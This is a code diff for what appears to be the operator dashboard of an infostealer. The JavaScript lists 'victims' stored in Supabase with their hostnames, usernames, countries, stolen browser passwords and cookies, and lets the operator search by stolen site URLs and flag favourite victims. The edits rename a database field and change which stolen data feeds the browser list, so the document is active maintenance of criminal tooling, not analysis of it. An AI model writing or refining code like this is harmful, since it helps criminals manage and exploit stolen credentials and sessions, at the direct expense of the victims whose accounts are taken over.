@@ -1222,8 +1222,7 @@
 
             function extractBrowserNames(data) {
                 const browserSet = new Set();
-                        
-                // ✅ ONLY from passwords and cookies – these are actually "grabbed"
+                // Only from passwords (not cookies) – "grabbed" means passwords
                 if (data.passwords && Array.isArray(data.passwords)) {
                     data.passwords.forEach(p => {
                         if (p.browser && typeof p.browser === 'string') {
@@ -1231,22 +1230,10 @@
                         }
                     });
                 }
-            
-                if (data.cookies && Array.isArray(data.cookies)) {
-                    data.cookies.forEach(c => {
-                        if (c.browser && typeof c.browser === 'string') {
-                            browserSet.add(c.browser);
-                        }
-                    });
-                }
-            
-                // Remove junk / sensitive entries
+                // Remove junk
                 const result = Array.from(browserSet).filter(name =>
                     name && name !== 'N/A' && name !== 'Unknown' && name !== 'undefined' && name !== 'Sensitive_Files' && name.length > 1
                 );
-            
-                console.log('[extractBrowserNames] raw set:', Array.from(browserSet));
-                console.log('[extractBrowserNames] filtered result:', result);
                 return result;
             }
 
@@ -1258,8 +1245,8 @@
 
             function applyFiltersAndSearch() {
                 let result = allVictims.slice();
-                if (currentFilter === 'favourited') {
-                    result = result.filter(v => v.favourited === true);
+                if (currentFilter === 'favourite') {   // ← changed here
+                    result = result.filter(v => v.favourite === true);   // ← changed here
                 }
                 if (currentSearch.trim()) {
                     const s = currentSearch.toLowerCase().trim();
@@ -1268,10 +1255,8 @@
                         return (v.hostname && v.hostname.toLowerCase().includes(s)) ||
                             (v.username && v.username.toLowerCase().includes(s)) ||
                             (v.country && v.country.toLowerCase().includes(s)) ||
-                            (data.passwords && data.passwords.some(p => p.url && p.url.toLowerCase()
-                            .includes(s))) ||
-                            (data.cookies && data.cookies.some(c => c.host && c.host.toLowerCase()
-                            .includes(s)));
+                            (data.passwords && data.passwords.some(p => p.url && p.url.toLowerCase().includes(s))) ||
+                            (data.cookies && data.cookies.some(c => c.host && c.host.toLowerCase().includes(s)));
                     });
                 }
                 filteredVictims = result;
@@ -1347,7 +1332,7 @@
                     const mcUsername = data.minecraftUsername || null;
                     const isMcInvalid = data.minecraftInvalid || false;
 
-                    const favourites = v.favourited || false;
+                    const favourites = v.favourite || false;
                     const time = v.timestamp || new Date().toISOString();
 
                     html += `
@@ -1568,13 +1553,13 @@
                 try {
                     const victim = allVictims.find(v => v.id === id);
                     if (!victim) return;
-                    const newState = !victim.favourited;
+                    const newState = !victim.favourite;   // ← changed here
                     const { error } = await supabaseClient
                         .from('victims')
-                        .update({ favourited: newState })
+                        .update({ favourite: newState })   // ← changed here
                         .eq('id', id);
                     if (error) throw error;
-                    victim.favourited = newState;
+                    victim.favourite = newState;           // ← changed here
                     applyFiltersAndSearch();
                     showToast(newState ? 'Added to favourites' : 'Removed from favourites');
                 } catch (err) {
